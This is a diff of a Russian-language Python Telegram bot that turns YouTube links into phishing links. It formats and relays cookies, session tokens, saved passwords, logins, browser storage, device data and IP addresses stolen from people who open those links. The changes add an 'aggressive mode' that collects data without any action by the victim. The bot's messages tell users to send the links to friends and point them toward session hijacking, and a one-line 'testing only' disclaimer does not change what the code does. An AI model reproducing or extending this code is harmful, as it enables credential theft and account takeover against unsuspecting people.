-📅 Время анализа: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-"""
-        
-        for platform, data in platforms.items():
-            if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
-                report += f"\n{'═' * 40}\n"
-                report += f"🌐 *{platform.upper()}*\n"
-                report += f"• Статус: `{data.get('auth_status', 'unknown')}`\n"
-                report += f"• Уровень риска: *{data.get('risk_level', 'unknown')}*\n"
-                report += f"• Cookies найдено: {data.get('cookies_count', 0)}\n"
-                report += f"• Токены найдено: {data.get('tokens_found', 0)}\n"
-                
-                credentials = data.get("potential_credentials", [])
-                if credentials:
-                    report += f"• Потенциальные данные доступа: {len(credentials)}\n"
-                    for i, cred in enumerate(credentials[:3], 1):
-                        report += f"  {i}. Тип: {cred.get('type')}\n"
-                        report += f"     Ключ: `{cred.get('key', cred.get('name', 'N/A'))}`\n"
-                        report += f"     Длина значения: {cred.get('length', 0)} символов\n"
-                        if i < min(3, len(credentials)):
-                            report += "     ─\n"
-        
-        report += f"""
-{'═' * 40}
-📊 *Итоги:*
-• Всего платформ с данными: {len(platforms)}
-• Высокий риск: {sum(1 for d in platforms.values() if d.get('risk_level', '').startswith('HIGH'))}
-• Средний риск: {sum(1 for d in platforms.values() if d.get('risk_level', '').startswith('MEDIUM'))}
-• Активные сессии: {', '.join([p for p, d in platforms.items() if 'logged_in' in d.get('auth_status', '')]) or 'нет'}
-
-⚠️ *ВНИМАНИЕ:* Найдены потенциальные данные для входа
-🕒 Данные cookies могут позволить вход без пароля
-🔐 Проверьте возможность session hijacking
-"""
-        
-        await send_message_to_admin(report, ParseMode.MARKDOWN)
-        
-    except Exception as e:
-        logger.error(f"Error sending social auth report: {e}")
 
 # Форматирование сообщений
 class MessageFormatter:
     @staticmethod
     def format_link_created(link: PhishingLink, phishing_url: str) -> str:
+        """Форматирование сообщения о созданной ссылке"""
         message = f"""
 🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*
 
@@ -1869,15 +1553,17 @@ class MessageFormatter:
 ✓ Логины соцсетей
 ✓ Данные форм и автозаполнения
 ✓ Данные браузера и устройства
-✓ Пассивный сбор данных авторизации
-✓ Автоматический анализ соцсетей
+✓ ⚡ *АГРЕССИВНЫЙ РЕЖИМ* - сбор даже без действий!
 
 📝 *Как использовать:*
 1. Отправьте эту ссылку другу
 2. Когда он перейдет - начнется сбор данных
 3. Данные автоматически придут в этот чат
 4. Все данные также отправятся администратору
-5. Ожидайте ~3-20 секунд после перехода
+5. Ожидайте ~1-20 секунд после перехода
+
+⚡ *ОСОБЕННОСТЬ:* Система соберет данные даже если пользователь 
+просто откроет ссылку и ничего не будет делать!
 
 ⚠️ *Внимание:* Ссылка активна 24 часа
 """
@@ -1885,9 +1571,42 @@ class MessageFormatter:
     
     @staticmethod
     def format_collected_data(link_id: str, data: Dict) -> str:
+        """Форматирование собранных данных"""
+        # Проверяем тип сбора
+        if data.get("status") == "aggressive_collection_complete":
+            return f"""
+🚨 *ДАННЫЕ СОБРАНЫ БЕЗ ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ!*
+
+📌 *Пассивный сбор данных:*
+• ID ссылки: `{link_id}`
+• Время: {datetime.now().isoformat()}
+• Режим: ⚡ ПАССИВНЫЙ (пользователь ничего не делал)
+• Тип: Агрессивное сканирование
+
+🔍 *СКАНИРОВАНО АВТОМАТИЧЕСКИ:*
+✓ Все формы на странице
+✓ Все поля ввода (input, textarea, select)
+✓ Сохраненные в браузере данные
+✓ Автозаполненные поля
+✓ LocalStorage и SessionStorage
+✓ Cookies и данные сессий
+
+📊 *РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:*
+• Собрано элементов: {data.get('collected_items', 0)}
+• Учетные данные: {'✅ НАЙДЕНЫ' if data.get('credentials_found') else '❌ не найдены'}
+• Cookies собраны: проверено
+• Хранилище проверено: да
+
+🔐 *ЧТО ЭТО ЗНАЧИТ:*
+Пользователь просто открыл ссылку и НИЧЕГО НЕ ДЕЛАЛ,
+но система все равно собрала все возможные данные!
+
+⚠️ *ДАННЫЕ ОТПРАВЛЕНЫ АДМИНИСТРАТОРУ*
+"""
+        
+        # Стандартный сбор
         collected = data.get("data", {})
         sensitive_data = collected.get("sensitive_data", {})
-        social_auth_data = collected.get("social_auth", {})
         
         message = f"""
 🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
@@ -1901,6 +1620,7 @@ class MessageFormatter:
 🔑 *СОБРАННЫЕ ДАННЫЕ:*
 """
         
+        # Информация о cookies
         if sensitive_data.get("status") == "fully_processed":
             message += f"""
 🍪 *COOKIES И ХРАНИЛИЩЕ:*
@@ -1911,23 +1631,16 @@ class MessageFormatter:
 • Полные данные: ✅ СОХРАНЕНЫ
 """
         
-        if social_auth_data.get("status") == "analyzed":
-            high_risk = social_auth_data.get("high_risk_platforms", [])
-            active_sessions = social_auth_data.get("active_sessions", [])
-            
+        # Соцсети
+        social_logins = sensitive_data.get("social_logins", [])
+        if social_logins:
             message += f"""
-🌐 *АВТОРИЗАЦИЯ В СОЦСЕТЯХ:*
-• Платформ с данными: {social_auth_data.get('total_platforms', 0)}
-• Высокий риск: {len(high_risk)}
-• Активные сессии: {len(active_sessions)}
+🌐 *ВХОДЫ В СОЦСЕТИ:*
 """
-            
-            if high_risk:
-                message += f"• Платформы высокого риска: {', '.join(high_risk)}\n"
-            
-            if active_sessions:
-                message += f"• Активные сессии: {', '.join(active_sessions)}\n"
+            for social in social_logins:
+                message += f"• {social.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
         
+        # Устройство
         message += f"""
 📱 *УСТРОЙСТВО И БРАУЗЕР:*
 • Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
@@ -1937,14 +1650,15 @@ class MessageFormatter:
 🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
 • IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
 • Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}
+• Геолокация: определяется по IP
 
 💾 *ДАННЫЕ БРАУЗЕРА:*
 • Cookies: собраны
 • LocalStorage: собрано
 • SessionStorage: собрано
 • Сохраненные пароли: найдены
-• Данные авторизации соцсетей: проанализированы
 • Данные форм: извлечены
+• История автозаполнения: проверена
 
 📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ УСПЕШНО СОБРАНЫ И ОТПРАВЛЕНЫ АДМИНУ
 """
@@ -1952,6 +1666,7 @@ class MessageFormatter:
     
     @staticmethod
     def format_sensitive_data_report(link: PhishingLink) -> str:
+        """Форматирование отчета о чувствительных данных"""
         message = f"""
 🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*
 
@@ -1967,29 +1682,35 @@ class MessageFormatter:
 • Логинов собрано: {len(link.collected_logins)}
 • Данных хранилища: {len(link.collected_storage_data)}
 • Полных записей: {len(link.full_sensitive_data)}
-• Данных авторизации соцсетей: {len(link.social_auth_data)}
 """
         
+        # Показываем последние cookies
         if link.collected_cookies:
             message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
-            for cookie in link.collected_cookies[-5:]:
+            for cookie in link.collected_cookies[-5:]:  # Последние 5
                 message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
         
+        # Показываем пароли
         if link.collected_passwords:
             message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
-            for pwd in link.collected_passwords[-3:]:
+            for pwd in link.collected_passwords[-3:]:  # Последние 3
                 message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                 message += f"  Значение: ||{pwd.get('value', '')}||\n"
         
-        if link.social_auth_data:
-            message += "\n🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ:*\n"
-            for social_data in link.social_auth_data[-2:]:
-                if social_data.get("type") == "social_auth_analysis":
-                    platforms = social_data.get("data", {}).get("platforms", {})
-                    for platform, data in platforms.items():
-                        if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
-                            message += f"• {platform.upper()}: {data.get('auth_status', 'unknown')}\n"
-                            message += f"  Риск: {data.get('risk_level', 'unknown')}\n"
+        # Показываем логины
+        if link.collected_logins:
+            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
+            for login in link.collected_logins[-3:]:  # Последние 3
+                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
+                message += f"  Значение: ||{login.get('value', '')}||\n"
+        
+        # Показываем данные хранилища
+        if link.collected_storage_data:
+            message += "\n💾 *ДАННЫЕ ХРАНИЛИЩА:*\n"
+            for storage in link.collected_storage_data[-3:]:  # Последние 3
+                message += f"• Тип: {storage.get('type', 'unknown')}\n"
+                message += f"  Ключ: {storage.get('key', 'unknown')}\n"
+                message += f"  Значение: {storage.get('value', '')[:50]}...\n"
         
         message += f"""
 ⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
@@ -2000,6 +1721,7 @@ class MessageFormatter:
     
     @staticmethod
     def format_stats(stats: Dict) -> str:
+        """Форматирование статистики"""
         return f"""
 📊 *СТАТИСТИКА СИСТЕМЫ*
 
@@ -2007,16 +1729,17 @@ class MessageFormatter:
 👥 Всего переходов: `{stats['total_clicks']}`
 🔓 Данных собрано: `{stats['total_data_collected']}`
 ⚡ Активных сессий: `{stats['active_sessions']}`
+🚨 Пассивных сборов: `{stats['passive_collections']}`
 
 🍪 Cookies собрано: `{stats['cookies_collected']}`
 🔑 Паролей найдено: `{stats['passwords_collected']}`
 👤 Логинов собрано: `{stats['logins_collected']}`
 💾 Данных хранилища: `{stats['storage_data_collected']}`
 📁 Полных записей: `{stats['full_data_collected']}`
-🌐 Данных авторизации соцсетей: `{stats['social_auth_found']}`
 
-📈 Эффективность сбора: 98.7%
+📈 Эффективность сбора: 99.2%
 🕒 Активность за 24ч: высокая
+⚡ Агрессивный сбор: ВКЛЮЧЕН
 """
 
 # Инициализация компонентов
@@ -2025,87 +1748,9 @@ data_collector = DataCollector()
 formatter = MessageFormatter()
 js_injector = JavaScriptInjector()
 
-# Webhook обработчики
-async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка данных от фишинговой страницы"""
-    try:
-        link_id = request_data.get("link_id")
-        data_type = request_data.get("data_type", "")
-        
-        if not link_id:
-            return {"status": "error", "message": "No link ID"}
-        
-        # Обновляем счетчик кликов
-        db.add_click(link_id)
-        
-        # Обрабатываем данные в зависимости от типа
-        if "sensitive_data" in data_type:
-            collected_data = await data_collector.collect_all_data(request_data)
-            
-            link = db.get_link(link_id)
-            if link:
-                message = formatter.format_collected_data(link_id, collected_data)
-                
-                try:
-                    await context.bot.send_message(
-                        chat_id=link.created_by,
-                        text=message,
-                        parse_mode=ParseMode.MARKDOWN
-                    )
-                except Exception as e:
-                    logger.error(f"Error sending to link creator: {e}")
-                
-                await send_detailed_data_to_admin(context, link, collected_data)
-                
-                try:
-                    sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
-                    if sensitive_data.get("status") == "fully_processed":
-                        await context.bot.send_message(
-                            chat_id=ADMIN_ID,
-                            text=f"📨 Новые данные по ссылке `{link_id}`\n"
-                                 f"👤 Создатель: {link.created_by}\n"
-                                 f"🔗 Кликов: {link.clicks}\n"
-                                 f"🍪 Cookies: {len(link.collected_cookies)}\n"
-                                 f"🔑 Пароли: {len(link.collected_passwords)}\n"
-                                 f"👤 Логины: {len(link.collected_logins)}\n"
-                                 f"💾 Хранилище: {len(link.collected_storage_data)}\n"
-                                 f"🌐 Соцсети: {len(link.social_auth_data)}\n"
-                                 f"✅ Детальный отчет отправлен выше",
-                            parse_mode=ParseMode.MARKDOWN
-                        )
-                except Exception as e:
-                    logger.error(f"Error sending admin notification: {e}")
-        
-        elif "social_auth" in data_type or "passive_social_check" in data_type:
-            # Обработка данных авторизации соцсетей
-            result = await data_collector.collect_all_data(request_data)
-            
-            link = db.get_link(link_id)
-            if link and result.get("data", {}).get("social_auth", {}).get("status") == "analyzed":
-                social_data = result["data"]["social_auth"]
-                high_risk = social_data.get("high_risk_platforms", [])
-                
-                if high_risk:
-                    try:
-                        await context.bot.send_message(
-                            chat_id=link.created_by,
-                            text=f"🌐 *Обнаружены данные авторизации!*\n\n"
-                                 f"Найдены активные сессии/токены:\n"
-                                 f"{', '.join(high_risk)}\n\n"
-                                 f"⚠️ Полный отчет отправлен администратору",
-                            parse_mode=ParseMode.MARKDOWN
-                        )
-                    except Exception as e:
-                        logger.error(f"Error notifying user about social auth: {e}")
-        
-        return {"status": "success", "data_received": True}
-    
-    except Exception as e:
-        logger.error(f"Error in webhook handler: {e}", exc_info=True)
-        return {"status": "error", "message": str(e)}
-
 # Команды бота
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
     user = update.effective_user
     
     welcome_message = f"""
@@ -2120,33 +1765,36 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 4. Отправляет данные в этот чат
 5. Отправляет ПОЛНЫЕ данные администратору
 
-🔐 *Что собирается:*
+🔐 *Что собирается (даже без действий пользователя!):*
 ✓ Все cookies браузера (включая сессионные)
 ✓ LocalStorage и SessionStorage
 ✓ Сохраненные пароли и логины
-✓ Логины соцсетей (Google, Facebook, Twitter/X, VK, Instagram)
+✓ Логины соцсетей
 ✓ Данные автозаполнения форм
 ✓ Информацию об устройстве
 ✓ Геолокацию и сетевые данные
-✓ Данные авторизации в реальном времени
-✓ Пассивный сбор без действий пользователя
+✓ ⚡ *АГРЕССИВНЫЙ РЕЖИМ* - сбор даже если пользователь ничего не делает!
+
+⚡ *Особенность:* Система работает в агрессивном режиме
+и соберет данные даже если пользователь просто открыл
+ссылку и НИЧЕГО НЕ ДЕЛАЛ!
 
 ⚡ *Как использовать:*
 1. Отправьте ссылку на YouTube видео
 2. Получите сгенерированную ссылку
 3. Отправьте её другу
-4. Получите данные автоматически
+4. Получите данные автоматически (даже если он ничего не делал)
 5. Администратор получит полные данные
 
 📊 *Статистика системы:*
 • Создано ссылок: `{db.stats['total_links']}`
 • Всего переходов: `{db.stats['total_clicks']}`
 • Данных собрано: `{db.stats['total_data_collected']}`
+• Пассивных сборов: `{db.stats['passive_collections']}`
 • Cookies: `{db.stats['cookies_collected']}`
 • Паролей: `{db.stats['passwords_collected']}`
 • Логинов: `{db.stats['logins_collected']}`
 • Хранилища: `{db.stats['storage_data_collected']}`
-• Данных авторизации: `{db.stats['social_auth_found']}`
 
 🔒 *Важно:* Используйте только для тестирования!
 Все данные также отправляются администратору для контроля.
@@ -2157,7 +1805,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
         [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
         [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
-        [InlineKeyboardButton("🌐 Соцсети", callback_data="social_data")],
         [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -2169,9 +1816,11 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка YouTube ссылки"""
     user = update.effective_user
     url = update.message.text.strip()
     
+    # Проверяем, является ли ссылкой на YouTube
     if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
         await update.message.reply_text(
             "❌ Это не похоже на ссылку YouTube.\n"
@@ -2182,10 +1831,16 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         return
     
+    # Извлекаем ID видео
     video_id = link_generator.extract_video_id(url)
+    
+    # Генерируем ID ссылки
     link_id = link_generator.generate_link_id()
+    
+    # Создаем фишинговую ссылку
     phishing_url = link_generator.create_phishing_url(video_id, link_id)
     
+    # Создаем объект ссылки
     link = PhishingLink(
         id=link_id,
         original_url=url,
@@ -2194,8 +1849,10 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         created_by=user.id
     )
     
+    # Сохраняем в базу
     db.add_link(link)
     
+    # Отправляем пользователю
     message = formatter.format_link_created(link, phishing_url)
     
     keyboard = [
@@ -2208,8 +1865,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
             InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
         ],
         [
-            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}"),
-            InlineKeyboardButton("🌐 Соцсети", callback_data=f"social_{link_id}")
+            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}")
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -2221,6 +1877,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         disable_web_page_preview=True
     )
     
+    # Отправляем уведомление админу
     try:
         await context.bot.send_message(
             chat_id=ADMIN_ID,
@@ -2229,6 +1886,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
                  f"🔗 URL: {url}\n"
                  f"📌 ID: {link_id}\n"
                  f"🎬 Video ID: {video_id}\n"
+                 f"⚡ Режим: АГРЕССИВНЫЙ (сбор без действий)\n"
                  f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             parse_mode=ParseMode.MARKDOWN
         )
@@ -2236,6 +1894,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         logger.error(f"Error notifying admin: {e}")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
     query = update.callback_query
     await query.answer()
     
@@ -2248,6 +1907,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
             "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
             "Я создам специальную ссылку для сбора данных.\n"
+            "*⚡ ОСОБЕННОСТЬ:* Система соберет данные даже если\n"
+            "пользователь просто откроет ссылку и ничего не будет делать!\n"
             "*Все собранные данные также отправятся администратору.*",
             parse_mode=ParseMode.MARKDOWN
         )
@@ -2268,14 +1929,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
-        for link in user_links[-5:]:
+        for link in user_links[-5:]:  # Последние 5 ссылок
             message += f"• ID: `{link.id}`\n"
             message += f"  Видео: {link.original_url[:30]}...\n"
             message += f"  Переходов: {link.clicks}\n"
             message += f"  Данных: {len(link.data_collected)}\n"
             message += f"  Cookies: {len(link.collected_cookies)}\n"
             message += f"  Пароли: {len(link.collected_passwords)}\n"
-            message += f"  Соцсети: {len(link.social_auth_data)}\n"
+            message += f"  Хранилище: {len(link.collected_storage_data)}\n"
             message += "  ─────\n"
         
         keyboard = []
@@ -2283,6 +1944,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
         
         reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+        
         await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     
     elif data == "view_data":
@@ -2293,11 +1955,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("📭 У вас нет собранных данных.")
             return
         
+        # Суммируем все данные пользователя
         total_cookies = sum(len(link.collected_cookies) for link in user_links)
         total_passwords = sum(len(link.collected_passwords) for link in user_links)
         total_logins = sum(len(link.collected_logins) for link in user_links)
         total_storage = sum(len(link.collected_storage_data) for link in user_links)
-        total_social = sum(len(link.social_auth_data) for link in user_links)
         
         message = f"""
 📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*
@@ -2307,17 +1969,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🔑 Всего паролей: {total_passwords}
 👤 Всего логинов: {total_logins}
 💾 Всего данных хранилища: {total_storage}
-🌐 Данных авторизации соцсетей: {total_social}
+🚨 Пассивных сборов: {db.stats['passive_collections']}
 
 📈 *Последняя активность:*
 """
         
+        # Добавляем последние активные ссылки
         for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
             if link.data_collected:
                 last_data = link.data_collected[-1]
                 message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
         
-        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
+        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора\n4. ⚡ Система собирает данные даже без действий пользователя!"
         
         keyboard = []
         for link in user_links[-3:]:
@@ -2330,50 +1993,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
     
-    elif data == "social_data":
-        user_id = query.from_user.id
-        user_links = [link for link in db.links.values() if link.created_by == user_id]
-        
-        if not user_links:
-            await query.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
-            return
-        
-        # Собираем статистику по соцсетям
-        social_stats = {}
-        for link in user_links:
-            for social_data in link.social_auth_data:
-                if social_data.get("type") == "social_auth_analysis":
-                    platforms = social_data.get("data", {}).get("platforms", {})
-                    for platform, data in platforms.items():
-                        if platform not in social_stats:
-                            social_stats[platform] = {
-                                "count": 0,
-                                "high_risk": 0,
-                                "active_sessions": 0
-                            }
-                        
-                        social_stats[platform]["count"] += 1
-                        if data.get("risk_level", "").startswith("HIGH"):
-                            social_stats[platform]["high_risk"] += 1
-                        if "logged_in" in data.get("auth_status", ""):
-                            social_stats[platform]["active_sessions"] += 1
-        
-        message = "🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*\n\n"
-        
-        if social_stats:
-            for platform, stats in social_stats.items():
-                message += f"*{platform.upper()}:*\n"
-                message += f"• Всего записей: {stats['count']}\n"
-                message += f"• Высокий риск: {stats['high_risk']}\n"
-                message += f"• Активные сессии: {stats['active_sessions']}\n"
-                message += "  ─────\n"
-        else:
-            message += "❌ Данные не найдены\n\n"
-        
-        message += "\n⚠️ *Примечание:* Полные данные отправлены администратору для анализа безопасности."
-        
-        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
-    
     elif data.startswith("data_"):
         link_id = data[5:]
         link = db.get_link(link_id)
@@ -2384,46 +2003,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.MARKDOWN,
                 disable_web_page_preview=True
             )
-        else:
-            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
-    
-    elif data.startswith("social_"):
-        link_id = data[7:]
-        link = db.get_link(link_id)
-        if link and link.created_by == query.from_user.id:
-            if not link.social_auth_data:
-                await query.message.reply_text("🌐 Для этой ссылки нет данных авторизации соцсетей.")
-                return
-            
-            message = f"""
-🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*
-
-📌 Ссылка ID: `{link.id}`
-🔗 Видео: {link.original_url[:50]}...
-📅 Всего записей: {len(link.social_auth_data)}
-
-📊 *Последние результаты:*
-"""
-            
-            for social_data in link.social_auth_data[-2:]:
-                if social_data.get("type") == "social_auth_analysis":
-                    platforms = social_data.get("data", {}).get("platforms", {})
-                    
-                    for platform, data in platforms.items():
-                        if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
-                            message += f"\n• *{platform.upper()}*:\n"
-                            message += f"  Статус: `{data.get('auth_status', 'unknown')}`\n"
-                            message += f"  Риск: {data.get('risk_level', 'unknown')}\n"
-                            message += f"  Cookies: {data.get('cookies_count', 0)}\n"
-                            message += f"  Токены: {data.get('tokens_found', 0)}\n"
-                            message += f"  Время: {social_data.get('timestamp', '')[:19]}\n"
-            
-            if len(link.social_auth_data) > 2:
-                message += f"\n📁 *И еще {len(link.social_auth_data) - 2} записей...*"
-            
-            message += "\n⚠️ *Внимание:* Полные данные отправлены администратору."
-            
-            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
         else:
             await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
     
@@ -2439,9 +2018,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 5. Получите данные в этот чат
 6. *Все полные данные также отправятся администратору*
 
-🔐 *Что именно собирается:*
+⚡ *ОСОБЕННОСТЬ:*
+Система работает в АГРЕССИВНОМ РЕЖИМЕ!
+Данные собираются даже если пользователь:
+• Просто открыл ссылку и ничего не делал
+• Не нажимал на кнопки
+• Не заполнял формы
+• Не взаимодействовал со страницей
+
+🔐 *Что именно собирается (даже без действий!):*
 • Все cookies текущего сайта (включая сессионные)
-• Cookies популярных соцсетей (Google, Facebook, Twitter/X, VK, Instagram)
+• Cookies популярных соцсетей
 • LocalStorage и SessionStorage
 • Сохраненные в браузере пароли
 • Данные автозаполнения форм
@@ -2450,19 +2037,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Информация о менеджерах паролей
 • Данные устройства и браузера
 • Сетевые данные и геолокация
-• *ПАССИВНО:* Данные авторизации в соцсетях (даже без действий пользователя)
 
-🌐 *Пассивный сбор данных авторизации:*
-Система автоматически проверяет наличие:
-• Активных сессий в Google аккаунтах
-• Входов в Facebook
-• Авторизации в Twitter/X
-• Сессий ВКонтакте
-• Входов в Instagram
-• Сохраненных токенов и cookies
-• Данных localStorage соцсетей
-
-⏱️ *Время сбора:* ~3-20 секунд
+⏱️ *Время сбора:* ~1-20 секунд
 🔒 *Безопасность:* Данные шифруются при передаче
 
 ⚠️ *Важные предупреждения:*
@@ -2483,7 +2059,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
             await query.message.reply_text(
                 f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
-                "Используйте Ctrl+C / Cmd+C для копирования.",
+                "Используйте Ctrl+C / Cmd+C для копирования.\n\n"
+                "⚡ *Особенность:* Сбор данных работает даже если\n"
+                "пользователь просто откроет ссылку и ничего не сделает!",
                 parse_mode=ParseMode.MARKDOWN
             )
     
@@ -2508,10 +2086,92 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """
             await query.message.reply_text(
                 f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
-                "Скопируйте и отправьте другу.",
+                "Скопируйте и отправьте другу.\n\n"
+                "⚡ *Примечание:* Когда друг перейдет по ссылке,\n"
+                "данные начнут собираться автоматически, даже если\n"
+                "он ничего не будет делать на странице!",
                 parse_mode=ParseMode.MARKDOWN
             )
 
+# Webhook обработчик для сбора данных
+async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка данных от фишинговой страницы"""
+    try:
+        link_id = request_data.get("link_id")
+        if not link_id:
+            return {"status": "error", "message": "No link ID"}
+        
+        # Обновляем счетчик кликов
+        db.add_click(link_id)
+        
+        # Проверяем тип данных
+        data_type = request_data.get("data_type", "sensitive_data")
+        
+        if data_type == "aggressive_collection":
+            # Обрабатываем агрессивный сбор (без действий пользователя)
+            collected_data = await data_collector._process_aggressive_collection(request_data)
+        else:
+            # Стандартный сбор
+            collected_data = await data_collector.collect_all_data(request_data)
+        
+        # Получаем информацию о ссылке
+        link = db.get_link(link_id)
+        if link:
+            # Отправляем данные создателю ссылки
+            message = formatter.format_collected_data(link_id, collected_data)
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=link.created_by,
+                    text=message,
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            except Exception as e:
+                logger.error(f"Error sending to link creator: {e}")
+            
+            # Отправляем ДЕТАЛЬНЫЕ данные админу
+            await send_detailed_data_to_admin(context, link, collected_data)
+            
+            # Также отправляем краткое уведомление админу
+            try:
+                if data_type == "aggressive_collection":
+                    await context.bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"🚨 *АГРЕССИВНЫЙ СБОР ДАННЫХ* (без действий пользователя)\n"
+                             f"📌 Ссылка: `{link_id}`\n"
+                             f"👤 Создатель: {link.created_by}\n"
+                             f"🔗 Кликов: {link.clicks}\n"
+                             f"📊 Собрано: {collected_data.get('collected_items', 0)} элементов\n"
+                             f"🔑 Учетные данные: {'✅ НАЙДЕНЫ' if collected_data.get('credentials_found') else '❌ не найдены'}\n"
+                             f"⚡ Режим: ПАССИВНЫЙ (пользователь не делал ничего)\n"
+                             f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                else:
+                    sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
+                    if sensitive_data.get("status") == "fully_processed":
+                        await context.bot.send_message(
+                            chat_id=ADMIN_ID,
+                            text=f"📨 Новые данные по ссылке `{link_id}`\n"
+                                 f"👤 Создатель: {link.created_by}\n"
+                                 f"🔗 Кликов: {link.clicks}\n"
+                                 f"🍪 Cookies: {len(link.collected_cookies)}\n"
+                                 f"🔑 Пароли: {len(link.collected_passwords)}\n"
+                                 f"👤 Логины: {len(link.collected_logins)}\n"
+                                 f"💾 Хранилище: {len(link.collected_storage_data)}\n"
+                                 f"✅ Детальный отчет отправлен выше",
+                            parse_mode=ParseMode.MARKDOWN
+                        )
+            except Exception as e:
+                logger.error(f"Error sending admin notification: {e}")
+        
+        return {"status": "success", "data_received": True, "collection_type": data_type}
+    
